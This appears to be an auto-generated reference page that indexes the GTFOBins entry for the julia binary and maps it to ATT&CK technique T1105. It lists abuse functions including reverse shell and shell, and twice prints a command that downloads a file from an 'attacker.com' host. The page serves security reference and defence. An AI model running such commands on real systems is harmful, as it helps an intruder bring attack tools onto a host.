---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# julia

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `julia` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for julia covering download, file-read, file-write, reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/julia.md)
- Source verification: [source record](../../sources/gtfobins/julia.md)

## Aliases

- `julia`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")' |

## Source Verification

[source record](../../sources/gtfobins/julia.md)

## Evidence Excerpt

```text
_body: ''
_name: julia
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/julia
functions:
download:
- code: julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
contexts:
sudo: null
```
